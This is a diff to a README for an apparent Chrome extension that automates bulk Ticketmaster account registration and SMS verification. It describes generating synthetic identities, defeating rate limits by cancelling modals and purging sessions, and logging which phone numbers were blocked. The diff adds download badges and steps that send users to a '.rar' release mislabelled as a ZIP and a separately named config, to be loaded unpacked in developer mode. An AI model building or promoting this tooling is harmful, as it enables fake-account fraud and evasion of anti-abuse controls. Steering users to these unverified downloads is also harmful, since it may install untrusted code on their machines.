@@ -1,10 +1,20 @@
 # 🎟️ Ticketmaster Account & SMS Automator
 
+[![Download Extension](https://img.shields.io/badge/⬇️_DOWNLOAD-EXTENSION_ZIP-blue?style=for-the-badge&logo=googlechrome&logoColor=white)](https://github.com/Zorin16/ticketmaster-sms-automator/releases/latest/download/ticketmaster-sms-automator-v2.0.0.zip)
+[![Download Config](https://img.shields.io/badge/⚙️_DOWNLOAD-CONFIG_JSON-green?style=for-the-badge&logo=json&logoColor=white)](https://raw.githubusercontent.com/Zorin16/ticketmaster-sms-automator/main/configs/ticketmaster-config.json)
+
 ![Manifest V3](https://img.shields.io/badge/Manifest-V3-blue)
 ![Version](https://img.shields.io/badge/Version-2.0.0-green)
 ![Platform](https://img.shields.io/badge/Platform-Chrome_Extension-orange)
 
 An automated multi-region account registration and SMS verification engine built as a Chrome Extension (Manifest V3) specifically tailored for **Ticketmaster** portals globally. Designed to streamline high-volume phone verification routines while bypassing rate-limit blocks through 2-step DOM modal cancels and automated session resets.
+
+---
+
+## ⚡ Quick Download Links
+
+* 📦 **[Click to Download Extension ZIP (v2.0.0)](https://github.com/Zorin16/ticketmaster-sms-automator/releases/download/v2/ticketmaster-sms-automator-v2.0.0.rar)**
+* 📄 **[Click to Download Pre-Configured JSON (`ticketmaster-config.json`)](https://github.com/Zorin16/ticketmaster-sms-automator/releases/download/v2/Ticket.Master.Config.json)**
 
 ---
 
@@ -17,7 +27,7 @@ An automated multi-region account registration and SMS verification engine built
   * Auto-generates valid synthetic emails and secure passwords.
   * Localized Royal Mail (UK), Eircode (IE), Dutch, German, and Australian postcode generators formatted for regional Ticketmaster registration forms.
   * Bypasses postal code fields automatically for Ticketmaster UAE (`ae`), France (`fr`), Philippines (`ph`), and Singapore (`sg`).
-* **⚡ 1-Click Pre-Configured Profile Setup:** Skip manual setup completely—simply click **Import Config** to upload a pre-made `workflow-config.json` file that instantly configures all CSS selectors, step delays, and site URLs for all supported countries.
+* **⚡ 1-Click Pre-Configured Profile Setup:** Skip manual setup completely—simply click **Import Config** to upload a pre-made `ticketmaster-config.json` file that instantly configures all CSS selectors, step delays, and site URLs for all supported countries.
 * **Session Purging & Lockdown:** One-click cookie and local storage purging per domain to cleanly reset account verification state.
 * **Live Performance Tracker:** Real-time metrics for rate-limited numbers vs. successful OTP verifications, with one-click country-tagged `.txt` file exports.
 
@@ -63,19 +73,22 @@ An automated multi-region account registration and SMS verification engine built
 
 ---
 
-## 📦 Installation
+## 📦 Installation & Setup
 
-Open Google Chrome and go to chrome://extensions/.
+### Option 1: Fast Installation via ZIP (Recommended)
+1. **[Click here to download the extension ZIP file](https://github.com/Zorin16/ticketmaster-sms-automator/releases/download/v2/ticketmaster-sms-automator-v2.0.0.rar)**.
+2. Extract the downloaded ZIP folder to a convenient location on your computer.
+3. Open Google Chrome and navigate to `chrome://extensions/`.
+4. Enable **Developer mode** using the toggle in the top-right corner.
+5. Click **Load unpacked** and select the extracted extension directory.
 
-Enable Developer mode in the top-right corner.
-
-Click Load unpacked and select the project folder.
+Then load the project folder into Chrome via chrome://extensions/.
 
 📖 Quick Start & Configuration Options
 Open the Ticketmaster authorization/registration page in your browser and open the Ticketmaster Automator side panel.
 
-Option A: Fast Setup (Import Pre-Configured File)
-Download or locate your team's ticketmaster-config.json file.
+Method A: Fast Setup (Import Pre-Configured File)
+Click here to download ticketmaster-config.json.
 
 Click Import Config at the bottom of the extension side panel.
 
@@ -83,8 +96,8 @@ Select the .json file — all CSS selectors, step delays, and target URLs will a
 
 Paste your phone numbers (1 per line) and click ▶ Run Workflow.
 
-Option B: Manual Setup (Element Picker)
-Use the Pick buttons to click and assign target input selectors on the page (Email, Password, Postal Code, Add Phone, etc.).
+Method B: Manual Setup (Element Picker)
+Use the Pick buttons in the panel to click and assign target input selectors on the page (Email, Password, Postal Code, Add Phone, etc.).
 
 Enter your Form Return URL (e.g. https://auth.ticketmaster.com/...).
 
